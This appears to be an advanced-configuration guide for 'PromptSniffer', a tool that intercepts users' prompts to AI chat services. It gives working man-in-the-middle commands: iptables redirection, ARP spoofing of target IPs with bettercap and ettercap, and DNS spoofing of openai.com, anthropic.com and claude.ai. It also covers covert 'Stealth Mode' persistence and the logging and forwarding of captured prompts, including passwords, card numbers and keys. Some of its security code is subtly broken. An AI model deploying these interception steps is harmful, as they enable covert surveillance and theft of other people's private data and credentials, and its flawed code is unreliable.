# PromptSniffer - Advanced Configuration

## Network-Wide Deployment Strategies

### Method 1: Router-Level Transparent Proxy

**Best for:** Complete network coverage without device configuration

**Requirements:**
- Router with custom firmware (DD-WRT, OpenWrt, etc.) OR
- Linux machine as gateway

#### Option A: Using iptables (Linux Gateway)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP/HTTPS to mitmproxy (transparent mode)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start mitmproxy in transparent mode
mitmdump -s prompt_interceptor.py --mode transparent --listen-host 0.0.0.0 --listen-port 8080
```

#### Option B: DHCP Proxy Auto-Config

Configure your DHCP server to auto-configure all clients:

**On your router/DHCP server:**
```
Option 252: http://<PromptSniffer_IP>/proxy.pac
```

**Create proxy.pac file:**
```javascript
function FindProxyForURL(url, host) {
    return "PROXY <PromptSniffer_IP>:8080";
}
```

Serve via HTTP on PromptSniffer machine:
```bash
python -m http.server 80
```

### Method 2: ARP Spoofing (Man-in-the-Middle)

**Best for:** Monitoring specific devices without their configuration

**⚠️ WARNING: Use only with proper authorization**

#### Using bettercap (Linux/Mac)

```bash
# Install bettercap
sudo apt install bettercap  # Linux
brew install bettercap      # Mac

# Start attack
sudo bettercap -iface eth0

# In bettercap console:
set arp.spoof.targets 192.168.1.100,192.168.1.101  # Target IPs
set arp.spoof.internal true
arp.spoof on

# Forward to mitmproxy
set http.proxy.port 8080
set https.proxy.port 8080
http.proxy on
```

Then start PromptSniffer:
```bash
sudo python3 run.py
```

#### Using ettercap (Linux)

```bash
# Install
sudo apt install ettercap-graphical

# Start MitM attack
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100-150//
```

### Method 3: DNS Spoofing + Proxy

**Best for:** Redirecting specific domains

```bash
# Install dnsmasq
sudo apt install dnsmasq

# Edit /etc/dnsmasq.conf
address=/openai.com/<PromptSniffer_IP>
address=/anthropic.com/<PromptSniffer_IP>
address=/claude.ai/<PromptSniffer_IP>

# Restart dnsmasq
sudo systemctl restart dnsmasq

# Start PromptSniffer in reverse proxy mode
mitmdump -s prompt_interceptor.py --mode reverse:https://api.openai.com@8080
```

---

## Custom Filtering and Analysis

### Filter by Client IP

Edit `prompt_interceptor.py`:

```python
def _is_llm_request(self, flow: http.HTTPFlow) -> bool:
    """Check if the request is to an LLM endpoint"""

    # Only monitor specific IPs
    MONITORED_IPS = ["192.168.1.100", "192.168.1.101"]

    if flow.client_conn.peername:
        client_ip = flow.client_conn.peername[0]
        if client_ip not in MONITORED_IPS:
            return False

    host = flow.request.pretty_host
    return any(domain in host for domain in self.llm_domains)
```

### Filter by Time (Business Hours Only)

```python
from datetime import datetime

def _is_llm_request(self, flow: http.HTTPFlow) -> bool:
    """Check if the request is to an LLM endpoint"""

    # Only monitor during business hours (9 AM - 5 PM)
    now = datetime.now()
    if now.hour < 9 or now.hour >= 17:
        return False

    # Only monitor weekdays
    if now.weekday() >= 5:  # 5 = Saturday, 6 = Sunday
        return False

    host = flow.request.pretty_host
    return any(domain in host for domain in self.llm_domains)
```

### Advanced Sensitive Content Detection

```python
import re

def _check_sensitive_content(self, prompt: str) -> List[str]:
    """Advanced sensitive content detection"""
    found = []

    # Check keywords
    keywords = self.config['monitoring']['sensitive_keywords']
    prompt_lower = prompt.lower()
    for keyword in keywords:
        if keyword.lower() in prompt_lower:
            found.append(keyword)

    # Check patterns
    patterns = {
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'credit_card': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
        'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
        'ip_address': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
        'aws_key': r'AKIA[0-9A-Z]{16}',
        'private_key': r'-----BEGIN (RSA |DSA )?PRIVATE KEY-----',
    }

    for name, pattern in patterns.items():
        if re.search(pattern, prompt):
            found.append(f'PATTERN:{name}')

    return found
```

### Database Logging

Store prompts in SQLite database:

```python
import sqlite3
from datetime import datetime

class PromptInterceptor:
    def __init__(self):
        # ... existing code ...
        self.db = self._init_database()

    def _init_database(self):
        """Initialize SQLite database"""
        conn = sqlite3.connect('prompts.db')
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS prompts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                client_ip TEXT,
                host TEXT,
                url TEXT,
                prompt TEXT,
                sensitive_keywords TEXT,
                prompt_length INTEGER
            )
        ''')
        conn.commit()
        return conn

    def _log_to_database(self, prompt: str, flow: http.HTTPFlow, keywords: List[str]):
        """Log prompt to database"""
        cursor = self.db.cursor()
        cursor.execute('''
            INSERT INTO prompts (timestamp, client_ip, host, url, prompt, sensitive_keywords, prompt_length)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            flow.client_conn.peername[0] if flow.client_conn.peername else None,
            flow.request.pretty_host,
            flow.request.pretty_url,
            prompt,
            ','.join(keywords),
            len(prompt)
        ))
        self.db.commit()

    def request(self, flow: http.HTTPFlow) -> None:
        """Process each request"""
        # ... existing code ...
        if prompt:
            self._log_to_database(prompt, flow, sensitive_keywords)
```

---

## Integration with Security Tools

### Send to Slack

```python
import requests

def _send_slack_alert(self, prompt: str, flow: http.HTTPFlow):
    """Send alert to Slack"""
    webhook_url = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

    message = {
        "text": "🚨 LLM Prompt Detected",
        "attachments": [{
            "color": "danger",
            "fields": [
                {"title": "Host", "value": flow.request.pretty_host, "short": True},
                {"title": "Client IP", "value": flow.client_conn.peername[0], "short": True},
                {"title": "Prompt", "value": prompt[:500] + "..." if len(prompt) > 500 else prompt}
            ]
        }]
    }

    requests.post(webhook_url, json=message)
```

### Forward to SIEM (Splunk)

```python
import requests
import json

def _send_to_splunk(self, prompt: str, flow: http.HTTPFlow):
    """Send event to Splunk HEC"""
    hec_url = "https://splunk.company.com:8088/services/collector"
    hec_token = "YOUR-HEC-TOKEN"

    event = {
        "event": {
            "prompt": prompt,
            "host": flow.request.pretty_host,
            "client_ip": flow.client_conn.peername[0] if flow.client_conn.peername else None,
            "url": flow.request.pretty_url,
            "timestamp": datetime.now().isoformat()
        },
        "sourcetype": "llm:prompt",
        "source": "PromptSniffer"
    }

    headers = {
        "Authorization": f"Splunk {hec_token}",
        "Content-Type": "application/json"
    }

    requests.post(hec_url, headers=headers, json=event, verify=False)
```

### Export to CSV

```python
import csv
from datetime import datetime

class PromptInterceptor:
    def __init__(self):
        # ... existing code ...
        self.csv_file = open('prompts.csv', 'a', newline='', encoding='utf-8')
        self.csv_writer = csv.writer(self.csv_file)
        # Write header if file is empty
        if self.csv_file.tell() == 0:
            self.csv_writer.writerow(['Timestamp', 'Client IP', 'Host', 'Prompt', 'Keywords'])

    def _log_to_csv(self, prompt: str, flow: http.HTTPFlow, keywords: List[str]):
        """Log to CSV file"""
        self.csv_writer.writerow([
            datetime.now().isoformat(),
            flow.client_conn.peername[0] if flow.client_conn.peername else '',
            flow.request.pretty_host,
            prompt,
            ','.join(keywords)
        ])
        self.csv_file.flush()
```

---

## Performance Optimization

### Multi-Processing for High Traffic

```python
# run_parallel.py
import subprocess
import sys

def main():
    """Start multiple mitmproxy instances"""
    processes = []

    # Start 4 instances on different ports
    for port in [8080, 8081, 8082, 8083]:
        cmd = [
            "mitmdump",
            "-s", "prompt_interceptor.py",
            "--listen-port", str(port)
        ]
        p = subprocess.Popen(cmd)
        processes.append(p)
        print(f"Started instance on port {port}")

    # Wait for all to finish
    for p in processes:
        p.wait()

if __name__ == "__main__":
    main()
```

Configure load balancer (nginx) to distribute:

```nginx
upstream mitmproxy {
    server 127.0.0.1:8080;
    server 127.0.0.1:8081;
    server 127.0.0.1:8082;
    server 127.0.0.1:8083;
}

server {
    listen 8000;
    location / {
        proxy_pass http://mitmproxy;
    }
}
```

### Asynchronous Email Sending

```python
import threading
import queue

class PromptInterceptor:
    def __init__(self):
        # ... existing code ...
        self.email_queue = queue.Queue()
        self.email_thread = threading.Thread(target=self._email_worker, daemon=True)
        self.email_thread.start()

    def _email_worker(self):
        """Background thread for sending emails"""
        while True:
            try:
                prompt, flow, keywords = self.email_queue.get()
                self._send_email_alert(prompt, flow, keywords)
                self.email_queue.task_done()
            except Exception as e:
                self.logger.error(f"Email worker error: {e}")

    def request(self, flow: http.HTTPFlow) -> None:
        """Process each request"""
        # ... existing code ...
        if prompt:
            # Queue email instead of sending directly
            self.email_queue.put((prompt, flow, sensitive_keywords))
```

---

## Monitoring Dashboard

Create a simple web dashboard to view captured prompts:

```python
# dashboard.py
from flask import Flask, render_template, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/prompts')
def get_prompts():
    conn = sqlite3.connect('prompts.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM prompts ORDER BY timestamp DESC LIMIT 100')
    prompts = cursor.fetchall()
    conn.close()
    return jsonify(prompts)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Stealth Mode

### Run as Windows Service

```python
# install_service.py
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import subprocess

class PromptSnifferService(win32serviceutil.ServiceFramework):
    _svc_name_ = "PromptSniffer"
    _svc_display_name_ = "PromptSniffer LLM Monitor"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.process = None

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        if self.process:
            self.process.terminate()

    def SvcDoRun(self):
        self.process = subprocess.Popen(['python', 'run.py'])
        win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(PromptSnifferService)
```

Install:
```bash
python install_service.py install
python install_service.py start
```

### Run as Linux systemd Service

```ini
# /etc/systemd/system/promptsniffer.service
[Unit]
Description=PromptSniffer LLM Monitor
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/PromptSniffer
ExecStart=/usr/bin/python3 /opt/PromptSniffer/run.py
Restart=always

[Install]
WantedBy=multi-user.target
```

Enable:
```bash
sudo systemctl enable promptsniffer
sudo systemctl start promptsniffer
```

---

## Troubleshooting Network Issues

### Debug Mode

Add to `prompt_interceptor.py`:

```python
def request(self, flow: http.HTTPFlow) -> None:
    """Process each request"""
    # Debug: Log ALL traffic
    self.logger.debug(f"Request: {flow.request.method} {flow.request.pretty_url}")

    # ... rest of code ...
```

Run with debug logging:
```bash
mitmdump -s prompt_interceptor.py -v
```

### Packet Capture

Capture raw packets for analysis:
```bash
# Linux
sudo tcpdump -i any -w traffic.pcap port 8080

# Windows (requires WinPcap)
windump -i 1 -w traffic.pcap port 8080
```

Analyze with Wireshark:
```bash
wireshark traffic.pcap
```

---

## Security Hardening

### Encrypt Log Files

```python
from cryptography.fernet import Fernet

class PromptInterceptor:
    def __init__(self):
        # Generate key (store securely!)
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

    def _encrypt_prompt(self, prompt: str) -> bytes:
        """Encrypt prompt before logging"""
        return self.cipher.encrypt(prompt.encode())

    def _decrypt_prompt(self, encrypted: bytes) -> str:
        """Decrypt prompt"""
        return self.cipher.decrypt(encrypted).decode()
```

### Restrict Access

```python
# Only allow monitoring from specific source
def request(self, flow: http.HTTPFlow) -> None:
    """Process each request"""

    # Check authorization
    auth_token = flow.request.headers.get("X-PromptSniffer-Auth")
    if auth_token != "YOUR_SECRET_TOKEN":
        self.logger.warning("Unauthorized access attempt")
        return

    # ... rest of code ...
```

---

## Multi-Tenant Setup

Monitor multiple organizations separately:

```python
# config_org1.json, config_org2.json, etc.

# Start multiple instances
mitmdump -s prompt_interceptor.py --set config=config_org1.json --listen-port 8080
mitmdump -s prompt_interceptor.py --set config=config_org2.json --listen-port 8081
```

---

For more information, see README.md
